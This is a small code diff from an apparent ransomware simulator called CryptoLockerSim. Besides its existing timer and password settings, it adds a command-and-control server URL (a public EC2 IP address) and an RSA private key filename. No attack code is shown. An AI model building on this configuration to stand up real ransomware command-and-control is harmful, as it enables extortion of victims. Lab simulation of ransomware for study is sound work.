@@ -8,3 +8,6 @@ script_name_elf = "/home/kali/Desktop/CryptoLockerSim/Main.elf" # Currently hard
 seconds_left = 600 # This variable will change the amount of time you have
 password = "test"
 timer_file_name = "timer.json"
+
+c2_server = "http://51.20.137.153:5000" # Public IP from my EC2 instance
+rsa_key = "private.pem"
